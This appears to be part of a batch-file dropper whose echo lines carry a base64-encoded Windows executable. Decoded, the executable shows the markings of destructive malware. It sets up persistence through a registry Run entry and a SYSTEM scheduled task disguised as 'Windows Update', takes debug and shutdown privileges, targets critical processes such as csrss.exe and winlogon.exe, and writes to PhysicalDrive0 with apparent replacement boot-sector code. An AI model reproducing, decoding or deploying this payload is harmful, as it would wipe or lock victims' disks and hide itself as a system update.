echo 6GP///9ZiV3siwOLQBiJReiLRfA7Reh1B1XoSf///1mLxplSUIpV5otF/IsI/1EY
echo XluL5V3Di8BVi+yDxPhTVovai/CDfQz/dQuBfQgAAACAchfrAnwTg30MAHULgX0I
echo ////f3Yb6wJ+F4sNUHVBALIBoSBfQADolIv//+ijIf//i0UIi9AzyYrLi8aLGP9T
echo FJmJRfiJVfyLRfiLVfxeW1lZXcIIAIvAU1ZXi9mL+ovwhdt0JovXi8uLxosw/1YQ
echo O9h0F4sNnHRBALIBoWzuQADoOov//+hJIf//X15bw5BTVleE0nQIg8Tw6Gke//+L
echo 8Yvai/gz0ovH6OIb//+JdwSLx4TbdA/opB7//2SPBQAAAACDxAyLx19eW8OLQATo
echo WFr//4P4/3UCM8DDi0AE6HRa//+D+P91AjPAw1WL7IPE+P91DP91CIPif4tABOiB
echo Wv//iUX4iVX8i0X4i1X8WVldwggAjUAAU4vai8iLw5lSUIvBixD/Ughbw5BVi+xT
echo i9j/dQz/dQgz0ovDiwj/URiLQwRQ6F5E///oyZz//1tdwggAVYvsU1aE0nQIg8Tw
echo 6KMd//+L2ovwZotFCFBqADPSi8boHwAAAIvGhNt0D+jcHf//ZI8FAAAAAIPEDIvG
echo XltdwgQAi8BVi+yDxNxTVlcz24ld4Ild3Ild6Ild5ITSdAiDxPDoTR3//4vxiFX/
echo i9iLfQwzwFVokRVBAGT/MGSJIGaB////dWmLVQiLxuhAWf//i8gz0ovD6KH+//+D
echo ewQAD42tAAAAjVXoi8boSVr//4tF6IlF7MZF8AvoHkP//41V5OjigP//i0XkiUX0
echo xkX4C41F7FBqAYsNjHVBALIBoQjtQADowIn//+iTH///62MPt9eLxuhbWP//i8gz
echo 0ovD6Dj+//+DewQAfUiNVeCLxujkWf//i0XgiUXsxkXwC+i5Qv//jVXc6H2A//+L
echo RdyJRfTGRfgLjUXsUGoBiw20c0EAsgGhZO1AAOhbif//6C4f//8zwFpZWWSJEGiY
echo FUEAjUXcugQAAADo2CT//8Pp1h7//+vri8OAff8AdA/oixz//2SPBQAAAACDxAyL
echo w19eW4vlXcIIAIvAU1bofRz//4vai/CLRgSFwHwF6LlY//+L04Di/IvG6KEZ//+E
echo 234Hi8boPhz//15bw41AAFWL7IPE+FNWV4lV+IlF/IM9YIhBAAAPhIYAAAChYIhB
echo AOiG5f//i/gzwFVoixZBAGT/MGSJIItfCEuD+wB8RIvTi8foiOP//4vwg338AHQI
echo i0YIO0X8dSWDffgAdA+LVhCLRfjor1L//4TAdBCL04vH6Gri//+LxugjGf//S4P7
echo /3W8M8BaWVlkiRBokhZBAKFgiEEA6Cbl///D6dwd///r7l9eW1lZXcONQABVi+xR
echo U1ZXiUX8gz1giEEAAHRroWCIQQDo4+T//4v4M8BVaBMXQQBk/zBkiSCLXwhLg/sA
echo fCmL04vH6OXi//+L8ItGBDtF/HUQi9OLx+ji4f//i8bomxj//0uD+/911zPAWllZ
echo ZIkQaBoXQQChYIhBAOie5P//w+lUHf//6+5fXltZXcNTi9iLy7IBoRTuQADoX4f/
echo /+huHf//W8Oh2HRBAOje////w5BTVovai/CLxuivAgAAOth0D/9OEIvG6LEDAADo
echo 1P///15bw5BTi9iLw+iOAgAAhMAPlMD/SxBbw1OL2IvD6HoCAAD/SxBbw5BWV1OJ
echo 14nLicbrNotOFCtOEHcKifDoMgAAAItOFDnZcgKJ2VYpy4tGCANGEAFOEInGicrB
echo 6QL886WJ0YPhA/OkXgnbdcZbX17DjUAAU1aL2ItTCItLDItDBIsw/1YMi/CJcxSF
echo 9nUXiw1EdUEAsgGhFO5AAOiLhv//6Joc//8zwIlDEF5bw4vAsgHoKf///8Mz0ugh
echo ////w1NWUYvyi9iL1LkBAAAAi8PoU////zPJigwki8Yz0ujtIv//i8bo6ib//4vQ
echo M8mKDCSLw+gw////Wl5bw1WL7IPE+FNWM8mJTfiL8ovYM8BVaA0ZQQBk/zBkiSCL
echo w+j2/v//LBJ0BCwCdRaNVfiLw+iEAAAAi1X4i8boKiT//+tTM8CJRfyLw+hQAQAA
echo LAZ0BiwGdBPrIo1V/LkBAAAAi8Pow/7//+sWjVX8uQQAAACLw+iy/v//6wXoV/7/
echo /4vGi1X86CUn//+LFotN/IvD6JX+//8zwFpZWWSJEGgUGUEAjUX46Jgn///D6Vob
echo ///r8F5bWVldw4vAVYvsagBqAGoAU1aL8ovYM8BVaPMZQQBk/zBkiSCLw+g8/v//
echo LAZ0BCwGdRaNVfSLw+gO////i1X0i8bolCj//+t3M8CJRfyLw+iWAAAALBJ0BiwC
echo dCvrXI1V/LkEAAAAi8PoCf7//4vGi1X86F8p//+LTfwDyYsWi8Po8f3//+s4jVX8
echo uQQAAACLw+jg/f//jUX4i1X86Fkm//+LVfiLTfyLw+jI/f//i9aLRfjo+jj//+sF
echo 6GP9//8zwFpZWWSJEGj6GUEAjUX06Fog//+NRfjoUiD//8PpdBr//+voXluL5V3D
echo UYvUuQEAAADof/3//4oEJFrDi8BVi+xqAFOL2DPAVWhQGkEAZP8wZIkgjVX8i8Po
echo 8P3//4N9/AB18DPAWllZZIkQaFcaQQCNRfzo9R///8PpFxr//+vwW1ldw5BVi+xT
echo i10Ig8P86weLA+ihAAAAiwPo8vz//4TAdO6LA+ib/f//W13DVYvsUVOL2I1V/ItF
echo CItA/LkEAAAA6O78//+LVfwPr9OLRQiLQPzoRQIAAFtZXcOQVYvsU4tdCIPD/Os7
echo iwPotfz//wT+LANzB4sD6DwAAACLA7oBAAAA6BQCAADrB4sD6MMBAACLA+h4/P//
echo hMB07osD6CH9//+LA+hm/P//hMB0uosD6A/9//9bXcNVi+yDxPgz0olV+IlF/DPA
echo VWifHEEAZP8wZIkgi0X86Mz+//+D4H+D+BQPh0kBAAD/JIVHG0EAiRxBAKAbQQCs
echo G0EAvhtBANAbQQDiG0EA9BtBAPQbQQCJHEEAiRxBAAQcQQASHEEAHBxBAIkcQQAq
echo HEEAMxxBAEIcQQBRHEEAYBxBAG4cQQB9HEEA6ekAAABV6Lb+//9Z6d0AAAC6AQAA
echo AItF/Og7AQAA6csAAAC6AgAAAItF/OgpAQAA6bkAAAC6BAAAAItF/OgXAQAA6acA
echo AAC6CgAAAItF/OgFAQAA6ZUAAACNVfiLRfzoJfz//+mFAAAAVbgBAAAA6HX+//9Z
echo 63eLRfzo+v3//+ttVbgBAAAA6F3+//9Z619V6IT+//9Z61a6BAAAAItF/Oi0AAAA
echo 60e6CAAAAItF/OilAAAA6zi6CAAAAItF/OiWAAAA6ylVuAIAAADoGf7//1nrG7oI
echo AAAAi0X86HkAAADrDFW4AQAAAOj8/f//WTPAWllZZIkQaKYcQQCNRfjoph3//8Pp
echo yBf//+vwWVldw4vAVYvsagBTi9gzwFVo6RxBAGT/MGSJII1V/IvD6Fj7//+Lw+g9
echo /v//M8BaWVlkiRBo8BxBAI1F/OhcHf//w+l+F///6/BbWV3DU1aBxAD///+L2ovw
echo hdt+L4H7AAEAAH4Wi9S5AAEAAIvG6HL6//+B6wABAADrDYvUi8uLxuhf+v//M9uF
echo 23/RgcQAAQAAXlvDVldTidaJy4nH6zaLTwwrTxB3Con46DIAAACLTww52XICidkp
echo y1eLRwgDRxABTxCJx4nKwekC/POlidGD4QPzpF8J23XGW19ew41AAFOL2ItTCItL
echo EItDBOiP9f//M8CJQxBbw7IB6PUAAADDM9Lo7QAAAMNTVldRi/mL8ovYi8aL1+hp
echo IP//dC+Lx+gUH///iQQkshSLw+jEAAAAi9S5BAAAAIvD6Fb///+L14sMJIvD6Er/
echo ///rT4vG6OUe//+JBCSBPCT/AAAAfxmyBovD6IwAAACL1LkBAAAAi8PoHv///+sX
echo sgyLw+hzAAAAi9S5BAAAAIvD6AX///+L1osMJIvD6Pn+//9aX15bw1WL7GoAU1aL
echo 8ovYM8BVaI0eQQBk/zBkiSCNVfyLxugBNf//i038i9aLw+g5////M8BaWVlkiRBo
echo lB5BAI1F/Oi4G///w+naFf//6/BeW1ldw41AAFGIFCSL1LkBAAAA6JD+//9aw4vA
echo aGSIQQDoljn//2jgHkEAagBq/2oA6MY4//+jTIhBAIM9TIhBAAB1Behvkf//wwAA
echo AAAAAGhkiEEA6Lo4//+hTIhBAFDohzj//8OLwFWL7FNWV6FUiEEA6JDc//+L+DPA
echo VWhRH0EAZP8wZIkgi18IS4XbfBVDM/aL1ovH6JDa///oWxD//0ZLde4zwFpZWWSJ
echo EGhYH0EAoVSIQQDoYNz//8PpFhX//+vuoVSIQQDoLhD//19eW13DkOir2P//w4vA
echo VYvsM8BVaBQgQQBk/zBkiSD/BVCIQQB1faFghkEA6IXY//+hSIhBAIsQ/1IU6Fr/
echo //8z0jPA6EX2//+4YIhBAOjXlf//6G42//+NgAgAAADox5X//7hYiEEA6L2V//+4
echo SIhBAOhbL///uGgfQQDo7S3//7iQQ0EA6J+V///o8v7//7hciEEA6JCV//+4SIhB
echo AOguL///M8BaWVlkiRBoGyBBAMPpUxT//+v4XcONQABVi+wzwFVoqSBBAGT/MGSJ
echo IIMtUIhBAAFzYehx/v//uGgfQQDofy3//7IBoWhnQADod5L//4vQhdJ0A4Pq1LhI
echo iEEA6OQu//+yAaEI9UAA6GzW//+jWIhBALIBoeDvQADoR9r//6NUiEEAsgGh4O9A
echo AOg22v//o2CIQQAzwFpZWWSJEGiwIEEAw+m+E///6/hdw4vA/////wEAAAAwAAAA
echo /////wEAAAAxAAAAVYvsM8BVaAghQQBk/zBkiSD/BXyIQQB1FbiUQ0EAuQIAAACL
echo FQAQQADogiL//zPAWllZZIkQaA8hQQDD6V8T///r+F3DjUAAgy18iEEAAcNoIUEA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGghQQAMAAAAQFxAAJwxQACoMUAA
echo rDFAALAxQACkMUAAKC9AAEQvQACAL0AAEkVSZWdpc3RyeUV4Y2VwdGlvbpDIIUEA
echo AAAAAAAAAADIIUEAAAAAAAAAAAAAAAAAAAAAANohQQAcAAAADBBAAJwxQACoMUAA
echo rDFAALAxQACkMUAAKC9AAEQvQABsIkEADgAAAAAAAQAAAAAQQAAQAAAACVRSZWdp
echo c3RyeVOL2IXbdAmAO1x1BDPAW8OwAVvD/sh0Dv7IdBD+yHQS/sh0FOsYuAEAAADD
echo uAIAAADDuAQAAADDuAMAAADDM8DDjUAAU1aE0nQIg8Tw6KIP//+L2ovwugEAAICL
echo xuiCAAAAx0YYPwAPAMZGDAGLxoTbdA/o1A///2SPBQAAAACDxAyLxl5bw5BTVujN
echo D///i9qL8IvG6BoAAACL04Di/IvG6PYM//+E234Hi8bokw///15bw1OL2ItDBIXA
echo dCGAewwAdAhQ6KI0///rBlDosjT//zPAiUMEjUMQ6IEX//9bw41AAFNWi/KL2ItD
echo CDvwdBqAexQAdApQ6G80///GQxQAiXMIi8Poqf///15bw4vAU1ZXi/mL8ovYi8Po
echo lP///4lzBI1DEIvX6IcX//9fXlvDjUAAi0gEhcl0BITSdQSLQAjDi8HDi8BVi+yD
echo xPBTVjPbiV30iE3/i9qL8DPAVWgxJEEAZP8wZIkgjUX0i9PohBf//4tF9OiE/v//
echo i9iE23USjUX0uQEAAAC6AQAAAOgIHP//M8CJRfiAff8AdAaDffQAdSqNRfhQi0YY
echo UGoAi0X06EUb//9Qi9OLxuhz////UOjFM///hcAPlEX+6zKNRfBQjUX4UGoAi0YY
echo UGoAagBqAItF9OgRG///UIvTi8boP////1DoeTP//4XAD5RF/oB9/gB0MIN+BAAP
echo lcCE2HQY/3YQaEwkQQD/dfSNRfS6AwAAAOiSGf//i030i1X4i8bo2f7//zPAWllZ
echo ZIkQaDgkQQCNRfToFBb//8PpNhD//+vwikX+XluL5V3DAAAA/////wEAAABcAAAA
echo U1aL8ovYi8bogxr//1CLQwRQ6Pky//+FwA+UwF5bw5BTVleL8Yv6i9iLxuhgGP//
echo QFBqAYvG6FUa//+LyIvXi8PoBgAAAF9eW8OLwFWL7IPE9FNWV4lN/Iv6i9iKRQjo
echo RP3//4vwi0UMUItF/FBWagCLx+gYGv//UItDBFDopjL//4XAdCSJffTGRfgLjUX0
echo UGoAiw2gdEEAsgGhHCFBAOjXef//6KoP//9fXluL5V3CCACQ/////wEAAAAwAAAA
echo /////wEAAAAxAAAAVYvsM8BVaFglQQBk/zBkiSD/BYCIQQB1FbicQ0EAuQIAAACL
echo FQAQQADoMh7//zPAWllZZIkQaF8lQQDD6Q8P///r+F3DjUAAgy2AiEEAAcNTu4iI
echo QQCDOwAPhTUBAABoyCZBAOibMv//iQODOwAPhCABAABo2CZBAIsDUOiLMv//o4yI
echo QQBo9CZBAIsDUOh5Mv//o5CIQQBoBCdBAIsDUOhnMv//o5SIQQBoFCdBAIsDUOhV
echo Mv//o5iIQQBoICdBAIsDUOhDMv//o5yIQQBoLCdBAIsDUOgxMv//o6CIQQBoSCdB
echo AIsDUOgfMv//o6SIQQBoWCdBAIsDUOgNMv//o6iIQQBoaCdBAIsDUOj7Mf//o6yI
echo QQBoeCdBAIsDUOjpMf//o7CIQQBoiCdBAIsDUOjXMf//o7SIQQBomCdBAIsDUOjF
echo Mf//o7iIQQBoqCdBAIsDUOizMf//o7yIQQBouCdBAIsDUOihMf//o8CIQQBoyCdB
echo AIsDUOiPMf//o8SIQQBo2CdBAIsDUOh9Mf//o8iIQQCDOwB0CYM9jIhBAAB1BDPA
echo W8OwAVvDAABrZXJuZWwzMi5kbGwAAAAAQ3JlYXRlVG9vbGhlbHAzMlNuYXBzaG90
echo AAAAAEhlYXAzMkxpc3RGaXJzdABIZWFwMzJMaXN0TmV4dAAASGVhcDMyRmlyc3QA
echo SGVhcDMyTmV4dAAAVG9vbGhlbHAzMlJlYWRQcm9jZXNzTWVtb3J5AFByb2Nlc3Mz
echo MkZpcnN0AABQcm9jZXNzMzJOZXh0AAAAUHJvY2VzczMyRmlyc3RXAFByb2Nlc3Mz
echo Mk5leHRXAABUaHJlYWQzMkZpcnN0AAAAVGhyZWFkMzJOZXh0AAAAAE1vZHVsZTMy
echo Rmlyc3QAAABNb2R1bGUzMk5leHQAAAAATW9kdWxlMzJGaXJzdFcAAE1vZHVsZTMy
echo TmV4dFcAAABTVovyi9joef3//4TAdAtWU/8VjIhBAF5bwzPAXlvDkFNWi/KL2OhZ
echo /f//hMB0C1ZT/xWkiEEAXlvDM8BeW8OQU1aL8ovY6Dn9//+EwHQLVlP/FaiIQQBe
echo W8MzwF5bw5BVi+wzwFVobShBAGT/MGSJIP8FhIhBADPAWllZZIkQaHQoQQDD6foL
echo ///r+F3Di8CDLYSIQQABw/8lGMNBAIvAVYvsg8TQU1ZXi9qJRfyLRfzoMhb//zPA
echo VWhnKUEAZP8wZIkgxkX7AI1F9FBqKOgdL///UOiHLv//hcAPhIgAAAAzwFVoSilB
echo AGT/MGSJII1F5FCLRfzo/RX//1BqAOhVLv//hcB0RMdF4AEAAACA6wFyC3UOx0Xs
echo AgAAAOsFM8CJRewzwIlF8I114I190KWlpaWNRfBQjUXQUGoQjUXgUGoAi0X0UOj1
echo Lf//M8BaWVlkiRBoUSlBAItF9FDoNy7//8PpHQv//+vvM8BaWVlkiRBobilBAI1F
echo /OjeEP//w+kAC///6/CKRftfXluL5V3DVYvsgcS4/v//U1ZXM9KJlcD+//+Jlbj+
echo //+Jlbz+//+JldD+//+JlcT+//+Jlcz+//+Jlcj+//+JRfyLRfzoFRX//4291P7/
echo /zPAVWjmKkEAZP8wZIkgM/Yz0rgCAAAA6Av+//+L2McHKAEAAIvXi8PoGv7//+m/
echo AAAAjYXI/v//jVckuQQBAADorhL//4uFyP7//42VzP7//+jNRP//i4XM/v//jZXQ
echo /v//6BQ+//+LhdD+//9QjZXE/v//i0X86P89//+LlcT+//9Y6OMT//90R42FvP7/
echo /41XJLkEAQAA6FYS//+Lhbz+//+NlcD+///ozT3//4uFwP7//1CNlbj+//+LRfzo
echo uD3//4uVuP7//1jonBP//3UXagCLRwhQagBqAei/Lf//UOjpLf//i/CL14vD6Hb9
echo //+FwA+FOf///1PowCz//zPAWllZZIkQaO0qQQCNhbj+//+6BwAAAOiLD///jUX8
echo 6F8P///D6YEJ///r4IvGX15bi+Vdw4vAU4PE2IvYoYh1QQCDOAJ1alRqKOjILP//
echo UOgyLP//g/gBG8BAhMB0Uo1EJAxQaIgrQQBqAOgPLP//g/gBG8BAx0QkCAEAAADH
echo RCQUAgAAALoQAAAAM8mJTCQEhMB0HI1EJARQjUQkHFBSjUQkFFBqAItEJBRQ6LYr
echo //9qAFPoTi3//4P4ARvAQIPEKFvDAAAAU2VTaHV0ZG93blByaXZpbGVnZQD/JRDD
echo QQCLwIPE+I1EJARQagBqAGoAagBqAGoAaCACAABqIGoCaKRDQQDoZSv//4P4ARvA
echo QIgEJIA8JAB0H1SLRCQIUGoA6LX///+EwHUExgQkAItEJARQ6D8r//+KBCRZWsOQ
echo VYvsg8TAU4lF/ItF/Oi+Ev//M8BVaHMsQQBk/zBkiSCNRcC6PAAAAOjLLP//x0XA
echo PAAAAMdFxEAAAACLRfzonRL//4lF0LiELEEAiUXMjUXAUOgVjv//g/gBG9tDM8Ba
echo WVlkiRBoeixBAI1F/OjSDf//w+n0B///6/CLw1uL5V3DAAAAcnVuYXMAAACyAbjM
echo LEEA6PD7//9qAGoAagHo3fv//7joLEEA6Mv8//+4/CxBAOjB/P//uBAtQQDot/z/
echo /8MAAP////8QAAAAU2VEZWJ1Z1ByaXZpbGVnZQAAAAD/////CQAAAGNzcnNzLmV4
echo ZQAAAP////8LAAAAd2luaW5pdC5leGUA/////wwAAABzZXJ2aWNlcy5leGUAAAAA
echo VYvsM8BVaD8tQQBk/zBkiSAzwFpZWWSJEGhGLUEAw+koB///6/hdwxIAAABQLUEA
echo 6FZAALhWQADcVEAAiFRAADhcQAAIXEAAIFdAAPBWQAAwWUAAAFlAAOy5QABsuEAA
echo pLpAAHS6QADcukAArLpAAETsQAAU7EAA0MJAAKDCQABE6kAAzOlAAIjrQABY60AA
echo DOxAALzrQAAgIEEAcB9BABQhQQDMIEEAZCVBABwlQQB4KEEASChBAAAAAAAgLUEA
echo VYvsuQQAAABqAGoASXX5UVNWV7hILUEA6Hco//8zwFVoBTBBAGT/MGSJILIBoXwh
echo QQDoEfT//4vYugEAAICLw+ij9P//sQG6HDBBAIvD6Pn0//+6VDBBAIvD6BH2//+N
echo VewzwOiT+v7/i03sulQwQQCLw+gY9v//i8PoOfT//4vD6CoB///oOf3//4TAdR5q
echo AGijAQAAaBEBAABqAGhkMEEA6Ekq//9Q6GMq///oEv3//4TAdTbrHmoAaKMBAABo
echo EQEAAGoAaGQwQQDoICr//1DoOir//41V6DPA6Bz6/v+LRejoOP3//4TAdMzo0/z/
echo /4TAD4QRAQAAsgGhfCFBAOhD8///i9i6AQAAgIvD6NXz//+xAbocMEEAi8PoK/T/
echo /7pUMEEAi8PoQ/X//4vD6ITz//+Lw+h1AP//agBofDBBAI1V4DPA6LD5/v//deBo
echo zDBBAI1F5LoDAAAA6F8O//+LReTolw///1DoWSn//76sQ0EAv9SIQQC5AAwAAPOl
echo agBqAGoDagBqA2gAAAAQaNAwQQDoJyj//4vYagBo0IhBAGgAMAAAaNSIQQBT6B4p
echo //9T6Ogn//+4zIhBALrsMEEA6PEK//+hzIhBALr4MEEA6HYO//91CI1F3OjM/P//
echo ocyIQQC6BDFBAOhdDv//dQq4BgAAAOgd+///ocyIQQC6EDFBAOhCDv//M8BaWVlk
echo iRBoDDBBAI1F3LoFAAAA6GQK///D6WIE///r619eW+hACf///////y0AAABTb2Z0
echo d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4AAAD/////
echo DgAAAFdpbmRvd3MgVXBkYXRlAABTaGVsbF9UcmF5V25kAAAA/////0YAAABzY2h0
echo YXNrcy5leGUgL0NyZWF0ZSAvVE4gIldpbmRvd3MgVXBkYXRlIiAvcnUgU1lTVEVN
echo IC9TQyBPTlNUQVJUIC9UUiAiAAD/////AQAAACIAAABcXC5cUGh5c2ljYWxEcml2
echo ZTAAAP////8BAAAATgAAAP////8BAAAAQgAAAP////8BAAAAUgAAAP////8BAAAA
echo TgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAACjUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyE4vAAI1AAACNQAAAjUAA
echo AAAAAAAAAABUIEAA5CFAAGQlQAAAy8zIydfPyM3O29ja2crc3d7f4OHjAOTljUAA
echo RXJyb3IAi8BSdW50aW1lIGVycm9yICAgICBhdCAwMDAwMDAwMACLwDAxMjM0NTY3
echo ODlBQkNERUb/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAADIAi8AfABwAHwAeAB8AHgAfAB8AHgAfAB4AHwAfAB0A
echo HwAeAB8AHgAfAB8AHgAfAB4AHwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAIhmQAAAAAAAHG1AAChtQAAAAACAAAAAQAAAAMAAAAAAAAAAAAEAAAACAAAA
echo AwAAAABaQAAIWkAAAABAdjprC946QIvACgAAAD8Ti8CAy6RMAFwmBSUuKmTYWkAA
echo 4FpAAOhaQADwWkAA+FpAAABbQAAIW0AAEFtAABhbQAAgW0AAKFtAADBbQAA4W0AA
echo QFtAAEhbQABQW0AAWFtAAGBbQABoW0AAcFtAAHhbQACAW0AAiFtAAJBbQACYW0AA
echo oFtAAKhbQACwW0AAuFtAAMBbQADIW0AA0FtAANhbQADgW0AA6FtAAPBbQAD4W0AA
echo AFxAAAIAAAAAAAAAAwAAAAAAAAAEAAAAAAAAAAUAAAAAAAAAZAAAAAAAAABlAAAA
echo AAAAAGoAAAAAAAAAFF9AAAAAAABsX0AAAAAAAMRfQAAAAAAAeGBAAAAAAADQYEAA
echo AAAAAChhQAAAAAAAgGFAAAAAAAA0YkAAAAAAAOxiQAAAAAAATGNAAAAAAAAAZEAA
echo AAAAAKRjQAAAAAAAWGRAAAAAAABYZEAAAAAAAFhkQAAAAAAAWGRAAAAAAABYZEAA
echo AAAAAFhkQAAAAAAAtGRAAAAAAABcXkAAAAAAAHBlQAAAAAAAJGZAAAAAAADBHlkg
echo AAAAAFcAB4AAAAAAAY1AAAAAAAAAjUAA/////2DjQABw40AAgONAAJTjQACk40AA
echo tONAAMTjQADY40AA6ONAAPjjQAAM5EAAHORAACzkQAA85EAATORAAFzkQABo5EAA
echo fORAAIzkQACc5EAAsORAAAABAAEAAQEAAAEBAAAAAQABAYvAmOtAAKjrQAC460AA
echo AAAAALwgQQDIIEEADCVBABglQQAAAAAAAAWLwLvgB47Djtu4FgK5AgC2ALsAAM0T
echo McCJw4nBicK+AAC/NgWsgf42BXMxPIBzAusPJH+Iwayq/smA+f919+vktAA8QHIF
echo JD+IxKyJwa2J8on+KcasquL8idbryLgTAM0Qu+AHjtu+NgW0AKy7AACJwbrIA4jY
echo 7kO6yQOs7qzurO7i7rsAoI7DvwAAuQB986X0tIa5MgDNFev2AAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAFWqngkAAAA/PAA7Bwk/Pz8wMDAfHQUnBAYSBwcxLgAAAAAEBAAI
echo CAAQEAAgIABAQEAAQICAAEEAAAFCAAACRAAABEgAAAhQAAAQYAAAIGQyMiSEBgIC
echo AgIEBAAICAAJGgCABwkTAIAGDy4AEBAAgQIHE0gACRoAHX8ACmUADX8ABxcACj4A
echo CYkAETEACqMAFxcAQUBAAUGbgAIQDwERVwEQJAAHFwCBBgYEEACCBwYGEUABNLwB
echo EE0BCiYBGkABFJgBFu0BLpMAQGZAAQwaAEFAQAFA+UABGiIEJOYEggcHB0E9QAEQ
echo JgZBQEABQj+AAg2BCTtAARZLCjhAARDzCRcACgdNARrRAEFAQAFBooACE/MJGiYB
echo ggYHBwTHAIAGCcMIQFEABYAABmIAB+wMBwkAggcHByMABSo8DkB6QAEGPgAKNgFA
echo UkABGQ8BQUBAAUCqQAEaAAUEGgCCBgYGQF9AAQm5AwfGAydAARAxBUBpgBEuQAEX
echo WgZAS0ABEG8PF9oSQUBAAUEdQAEGwwMGbxRAk0ABF4AWO0ABQEeAFg2gAA0FASGA
echo FkBpAApBQEABQUaAAkngoCaGAQEBAQEBBRYdAIAIBh4ABgYADScAgAUWFwAQMQAH
echo BwAQMQAKFwAQUQAntgAHLgAKeQAGEACACBOJABrrAAckABPUABcPAUFAQAFBboAC
echo Gm8ABgoAB60ADQ0ADQ0AFPIAGQIBQExAAQkdAA4nAB1AAQq6AC5DAUFAQAFBgYAC
echo EzEFQHxAARtaARrRACAaBUFAQAFCgIACQE9AARPPCQ1ABhQaAA0gARNqCTVAARNs
echo ACFAARSGCkFAQAFBsoACF44EIQAFEFcBCjgbhAUFBQUFKHYJIQAFFMYBIAAFHWAO
echo QKBAAS42EkFAQAFA+UABFxsRQFFAAUCtAApAREABQPxAC0FAQAFBAkABF7UJJ4AW
echo HQAKDoAWQE4ACkFAQAFBw4ACb3XVcoUEAwMDAwMICACEAwMEAAcHCgAEFgCBAAAH
echo CACABQkfAAkqAIEDBAcKAA45VwpJAIAACC8ADd07Ch8ABg0ABAkAC14ACA0ABTkA
echo BEcwggQDBAWFAAZrAA2nAAUvAAtzAIEDBA1eAEBnPwEFBQAEmQAECAEGhAAJfwCA
echo BAYmAQUPMQgJAQoRAQUaAIAFD64ACkkAGEABBC8ACHgAgAUHLwAKJwAFEQAHGgAK
echo QAELYwAEEQAKSQAOkgAMXgBAZD8BDYQAEkABBogAD5UAD0ABCdEAMUABBhoAB4AB
echo Cl4AC30AQUBAAUCwQAEEewQMRAQYQAEH9wQYQAEJgwQFDAAOjAQRXgAcQAEIKwAM
echo kQUWQAEFHwCABQcVAAQQAEBmRQERhAAWmQA3gAIJIgAZgAIUXgA/gAIJswFAcUAB
echo Bd0GENkGPMADIkABQFTAAwVFAwYXAEBvgAc1QAEbgAc0QAFAQoAHQG1AAQwACg8A
echo BQniABcABSIAChdAAR0ABRcAChBSBA2nCg0ACgoABUBpBQpDwP8OB4AEDfcFC5UE
echo CJUFDOIICJEEBCoABjgACYQJEJEHQNw/AQrIBQczAQkRAA0aAA5mBwTYBgZvAYAH
echo CRoAC28HCQAHQOhAAQyJAgrADQhiCA0mBwouCAQRABAAChLECUFAQAFA5/8TCwAU
echo EEABDZUTD7cJDUABBOsSDuIKQOxFBgmADBBACwpAFR+AAkEDQAEJgAwPwAMOQAZB
echo DEABCrwIKkABCGYHBYAHBdEDCKsNQPOAAgwABQ5AFQk8BgXaCCAACgpAAQ0AD0+A
echo 3igAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
